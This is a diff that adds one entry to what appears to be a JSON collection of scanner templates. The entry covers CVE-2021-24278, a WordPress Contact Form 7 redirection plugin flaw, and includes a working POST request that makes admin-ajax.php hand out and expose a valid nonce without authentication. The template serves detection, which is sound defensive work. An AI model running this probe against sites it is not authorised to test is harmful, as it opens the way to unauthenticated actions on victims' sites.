@@ -33131,6 +33131,65 @@
       ]
     },
     {
+      "id": "CVE-2021-24278",
+      "info": {
+        "author": "2rs3c",
+        "classification": {
+          "cve-id": "CVE-2021-24278",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5
+        },
+        "description": "In the Redirection for Contact Form 7 WordPress plugin before 2.3.4, unauthenticated users can use the wpcf7r_get_nonce AJAX action to retrieve a valid nonce for any WordPress action/function.",
+        "name": "Redirection for Contact Form 7 < 2.3.4 - Unauthenticated Arbitrary Nonce Generation",
+        "reference": [
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24278",
+          "https://wpscan.com/vulnerability/99f30604-d62b-4e30-afcd-b482f8d66413",
+          "https://www.wordfence.com/blog/2021/04/severe-vulnerabilities-patched-in-redirection-for-contact-form-7-plugin/"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2021,wordpress,wp-plugin"
+      },
+      "requests": [
+        {
+          "body": "action=wpcf7r_get_nonce&param=wp_rest",
+          "extractors": [
+            {
+              "part": "body",
+              "regex": [
+                "\"nonce\":\"[a-f0-9]+\""
+              ],
+              "type": "regex"
+            }
+          ],
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "regex": [
+                "\"success\":true",
+                "\"nonce\":\"[a-f0-9]+\""
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-24285",
       "info": {
         "author": "ShreyaPohekar",
